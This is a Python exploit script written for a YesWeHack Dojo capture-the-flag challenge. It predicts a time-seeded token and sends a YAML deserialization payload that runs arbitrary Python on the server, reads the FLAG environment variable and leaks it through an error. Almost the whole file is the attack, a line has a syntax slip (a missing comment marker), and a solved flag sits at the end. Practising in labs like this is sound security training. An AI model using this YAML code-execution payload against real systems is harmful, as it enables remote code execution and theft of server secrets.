import time
import sys
import random
import requests
import urllib.parse
import re
from email.utils import parsedate_to_datetime

def genToken(seed: str) -> str: # func extracted from challenge official source code 
    random.seed(seed)
    return ''.join(random.choices('abcdef0123456789', k=16))

def main():
    if len(sys.argv) < 2 :
        print("Usage: python3 script.py '<HTTP-Date>' ")
        sys.exit(1)
    t = sys.argv[1] # time is passed as parameter and then reshaped to match timestamp() format 
    dt = parsedate_to_datetime(t) # + 1 manual adjust
    now = int(dt.timestamp())
    token = genToken(now) craft token based on server time 

#paylaod used to leak flag
    yaml_payload = """
firmware:
  version: !!python/object/apply:builtins.exec 
  - |
    import threading
    def leak_flag():
        import os
        flag = os.environ.get("FLAG", "no_flag")
        raise Exception(f"FLAG_LEAK: {flag}")
    threading.Thread(target=leak_flag).start() # starting thread in server context triggers error relfected in output server (see snippet below)
""" 

    url = "https://dojo-yeswehack.com/api/challenges/92c3664c-8d6c-495d-86cf-ab3fa9098e38"

#to reproduce exploit log in yes we hack dojo, copy post request as curl and extract relevant headers informations to adjust headers dict below
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Referer': 'https://dojo-yeswehack.com/api/challenges/92c3664c-8d6c-495d-86cf-ab3fa9098e38',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Origin': 'https://dojo-yeswehack.com',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Cookie': '_pk_ref.4.069a=%5B%22%22%2C%22%22%2C1754763836%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.4.069a=f47f02c61cbebfc0.1754671403.; jwt=YOUR_JWT dojo_ui_settings={"htmlRenderMode":"render"}; _pk_ses.4.069a=1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
    }

    raw_data = f"yaml={yaml_payload}&token={token}"
    response = requests.post(url, headers=headers, data=raw_data)
#verbosity, debugging
    print(f"[+] Token used: {token}")
    print(f"[+] Local time used: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(now))} UTC")
    print("[+] Response status:", response.status_code)
    server_date = response.headers.get("date")
    if server_date:
        print(f"[+] Server response Date header: {server_date}")
    else:
        print("[!] Server date header not found in response.")
    print("[+] Response content:")
    print(response.text)

if __name__ == "__main__":
    main()
#FLAG{37e579d4f69510d4e79258973ae0aa8f}
